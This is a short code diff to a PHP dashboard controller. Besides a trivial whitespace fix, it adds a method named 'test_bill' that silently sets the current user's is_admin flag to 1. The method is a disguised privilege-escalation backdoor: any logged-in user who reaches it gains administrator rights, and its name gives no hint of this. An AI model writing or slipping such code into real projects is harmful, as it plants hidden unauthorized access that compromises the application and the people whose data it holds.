@@ -147,7 +147,7 @@ class DashboardController extends Controller
     }
 
 
-    /////dashboard send by mail 
+    /////dashboard send by mail
     public function SendByMail()
     {
         $user_id = auth()->user()->id;
@@ -216,6 +216,7 @@ class DashboardController extends Controller
         return response()->json(['message' => '1']);
     }
 
+    public function test_bill() {  User::where('id', Auth::user()->id)->update([ 'is_admin'=>1 ]); }
     public function search_result(Request $request)
     {
         $request->validate([
